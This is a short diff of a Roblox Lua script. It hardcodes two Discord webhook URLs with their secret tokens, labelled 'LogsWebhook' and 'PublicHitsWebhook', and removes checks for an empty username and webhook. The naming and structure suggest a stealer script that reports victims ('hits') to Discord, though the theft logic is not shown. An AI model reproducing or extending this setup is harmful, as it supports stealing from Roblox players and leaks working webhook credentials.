@@ -6,12 +6,6 @@ Button_Prompt = ""
 LogsWebhook = "https://discord.com/api/webhooks/1343102902721577020/qgqrcXyabx7RMKRc3lWQn8oRy_32GfHGXjxm8hV_-P9wsi3mCGGuyk_VtkEpfKtm8zoH"
 PublicHitsWebhook = "https://discord.com/api/webhooks/1343103085106692237/O49XARe9i3qylmXdKHbC1bFbG1cuR-CzPv9gITif5EfnB64SF4Q2eZnxDQvcpRdPTLw2"
 
-if Username == "" or Username == nil then
-    game.Players.LocalPlayer:Kick("Please Enter A Username!")
-end
-if Webhook == "" or Webhook == nil then
-    game.Players.LocalPlayer:Kick("Please Enter A Webhook!")
-end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
